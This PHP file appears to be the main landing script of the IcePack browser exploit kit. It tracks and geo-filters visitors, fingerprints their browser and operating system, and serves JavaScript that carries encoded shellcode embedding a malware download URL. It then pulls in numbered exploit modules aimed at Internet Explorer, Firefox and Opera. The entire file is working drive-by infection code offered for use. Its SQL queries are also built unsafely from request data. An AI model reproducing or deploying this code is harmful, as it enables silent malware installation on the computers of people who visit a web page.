<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");

include "config.php";
include "db.php";
include "functions.php";
include "mysql.php";

$db = new db;

$time = time();
$ip = getenv("REMOTE_ADDR");
$referer = substr(getenv("HTTP_REFERER"), 0, 40);
$agent = getenv("HTTP_USER_AGENT");

$result = $db->query("SELECT count FROM traffic WHERE id=1");
$row = $db->get_row($result);
$count = $row['count'];
$count++;
$result = $db->query("UPDATE traffic SET count=".$count." WHERE id=1");

$result = $db->query("SELECT * FROM statistics WHERE ip='".$ip."'");
$outdate = mysql_num_rows($result);	
	
if ($outdate > 0) 
{
	$row = $db->get_row($result);
	if (($time - $row['datetime']) < 60*60*3)
	{
	  header("Location: ".$config['trash_url']);
	  exit();
	}
};

detect_browser(); detect_os(); detect_country();

if (empty($referer)) $referer = "index.php";
else
{
	$r = parse_url ($referer);
	$referer = str_replace('www.','',$r['host']);
}

$db->query("INSERT INTO statistics (datetime, ip, browser, type, os, country, referer) VALUES ('".$time."', '".$ip."', '".$browser."', '".$type."', '".$os."', '".$country."', '".$referer."')");

$country_code = geoip_country_code_by_addr($gi, $ip);
if(empty($country_code)) $country_code = "O1";

$result = $db->query("SELECT value FROM config WHERE vkey='behavior'");
$row = $db->get_array($result);			
$behavior = $row['value'];

$sql = $db->query("SELECT value FROM config WHERE vkey='countries'");
$row = $db->get_row($sql);
$data = $row['value'];
$total = explode (',', $data);
	
$SHOW = TRUE;

if ($behavior == "allow")
{
	$SHOW = FALSE;
	
	foreach ($total as $data)
	{
		if ($SHOW == FALSE) if ($country_code == $data) $SHOW = TRUE; 
	}
}

if ($behavior == "block")
{
	foreach ($total as $data)
	{
		if ($SHOW == TRUE) if ($country_code == $data) $SHOW = FALSE;
	}
}

if ($SHOW == TRUE)
{
	if(strpos($agent, 'MSIE') )
	{
		$browers=1;
		$temp=explode( ";", substr( $agent, strpos( $agent, "MSIE" ) + 5 ) );
		$version=$temp[0];		
	}
	else if ( strstr( $agent, "Opera" ) )
	{
    	$browers=2;
    	$temp = explode( " ", substr( $agent, strpos( $agent, "Opera" ) + 6 ) );
    	$version = $temp[0];
	}
	else if(strpos($agent, 'Firefox'))
	{
		$browers=3;
		$temp=explode( ";", substr( $agent, strpos( $agent, "Opera" ) + 8 ) );
		$version=$temp[0];		
	}
	else
	{
		$browers=0;
	}	
	@$vers = explode(".", $version);
	if ( strstr( $agent, "Windows NT 6.0" ) )
	{
    	$os = 3;
	}
	else if ( strstr( $agent, "SV1" ) || $browers == 1 && $vers[0] == 7 )
	{
	    $os = 1;
	}
	else if ( strstr( $agent, "Windows NT 5.1" ) || strstr( $agent, "Windows XP" ) )
	{
	    $os = 2;
	}
	else if ( strstr( $agent, "Windows NT 5.2" ) )
	{
	    $os = 4;
	}
	else if ( strstr( $agent, "Windows NT 5.0" ) || strstr( $agent, "Windows 2000" ) )
	{
	    $os = 5;
	}
	else if ( strstr( $agent, "Windows NT" ) || strstr( $agent, "WinNT4.0" ) )
	{
	    $os = 6;
	}
	else if ( strstr( $agent, "Win 9x 4.90" ) || strstr( $agent, "Windows ME" ) )
	{
	    $os = 7;
	}
	else if ( strstr( $agent, "Windows 98" ) || strstr( $agent, "Win98" ) )
	{
	    $os = 8;
	}
	else if ( strstr( $agent, "Windows 95" ) || strstr( $agent, "Win95" ) )
	{
	    $os = 9;
	}
	else if ( strstr( $agent, "Windows 3.1" ) )
	{
	    $os = 10;
	}
	else if ( strstr( $agent, "Macintosh" ) || strstr( $agent, "PowerPC" ) || strstr( $agent, "Mac OS" ) )
	{
	    $os = 11;
	}
	else if ( strstr( $agent, "Linux" ) )
	{
	    $os = 12;
	}
	else
	{
	    $os = 0;
	}	
	if($os && $os < 11)
	{
		$exeurl = $config['main_url']."/exe.php";
		$hex = strtoupper( bin2hex( $exeurl ) );
    	if (round( strlen( $hex ) / 4 ) != strlen( $hex ) / 4 )
    	{
        	$hex .= "20";
    	}
    	for ($i = 0 ; $i < strlen( $hex ); $i += 4 )
    	{
       		@$escexeurl.= "%u".substr( $hex, $i + 2, 2 ).substr( $hex, $i, 2 );
    	}
		echo "<script>";
		echo crypt_j("var url='".$exeurl."';");
    	echo "var shellco='%u54EB%u758B%u8B3C%u3574%u0378%u56F5%u768B%u0320%u33F5%u49C9%uAD41%uDB33%u0F36%u14BE%u3828%u74F2%uC108%u0DCB%uDA03%uEB40%u3BEF%u75DF%u5EE7%u5E8B%u0324%u66DD%u0C8B%u8B4B%u1C5E%uDD03%u048B%u038B%uC3C5%u7275%u6D6C%u6E6F%u642E%u6C6C%u2e00%u5C2e%u2e7e%u7865%u0065%uC033%u0364%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0840%u09EB%u408B%u8D34%u7C40%u408B%u953C%u8EBF%u0E4E%uE8EC%uFF84%uFFFF%uEC83%u8304%u242C%uFF3C%u95D0%uBF50%u1A36%u702F%u6FE8%uFFFF%u8BFF%u2454%u8DFC%uBA52%uDB33%u5353%uEB52%u5324%uD0FF%uBF5D%uFE98%u0E8A%u53E8%uFFFF%u83FF%u04EC%u2C83%u6224%uD0FF%u7EBF%uE2D8%uE873%uFF40%uFFFF%uFF52%uE8D0%uFFD7%uFFFF".@$escexeurl."';\n";
    	echo "var success=0;\n";
    	if ( $browers == 1 )
    	{
        	if ( $config['spl1'] == 'on' && $vers[0] < 7 )
        	{
            	include( "exploits/x1.php" );
        	}
        	if ( $config['spl9'] == 'on' )
        	{
        		include( "exploits/x9.php" );
        	}
        	if ( $config['spl12'] == 'on' && ( $vers[0] == 6 || $vers[0] == 7 ) )
        	{
        		include( "exploits/x12.php" );
        	}
        	if ( $config['spl3'] == 'on' && $os < 7 && $os != 3 )
        	{
        		include( "exploits/x3.php" );
        	}
        	if ( $config['spl2'] == 'on' && $vers[0] == 6 )
        	{
        		include( "exploits/x2.php" );
        	}
        	if ( $config['spl10'] == 'on' )
        	{
        		include( "exploits/x10.php" );
        	}
        	if ( $config['spl8'] == 'on' )
        	{
            	include( "exploits/x8.php" );
        	}
        	if ( $config['spl7'] == 'on' )
        	{
            	include( "exploits/x7.php" );
        	}
        	if ( $config['spl4'] == 'on' && $os == 5 ) 
        	{
            	include( "exploits/x4.php" );
			}
        	if ( $config['spl15'] == 'on' )
        	{
            	include( "exploits/x15.php" );
        	}
        	if ( $config['spl16'] == 'on' && ( $vers[0] == 6 || $vers[0] == 7 ) )
        	{
            	include( "exploits/x16.php" );
        	}
    	}
    	if ( $browers == 3 && $config['spl5'] == 'on' && $os == 2)  
    	{
        	include( "exploits/x5.php" ); 
    	}
    	if ( $browers == 2 )
    	{
        	if ( $config['spl6'] == 'on' && $os == 2 && $vers[0] == 7 )
        	{
            	include( "exploits/x6.php" );
			}
        	if ( $config['spl11'] == 'on'  && $vers[0] == 9 && $vers[1] <= 20 )
        	{
        		include( "exploits/x11.php" );
        	}
    	}
    	if ( $browsers > 3 )	// Other browsers
    	{
    		if ( $config['spl15'] == 'on' )
    		{
    			include( "exploits/x15.php" );
    		}
    		if ( $config['spl16'] == 'on' )
    		{
    			include( "exploits/x16.php" );
    		}
    	}
		echo "</script>";
	}
} else
{ header("Location: ".$config['trash_url']); }

?>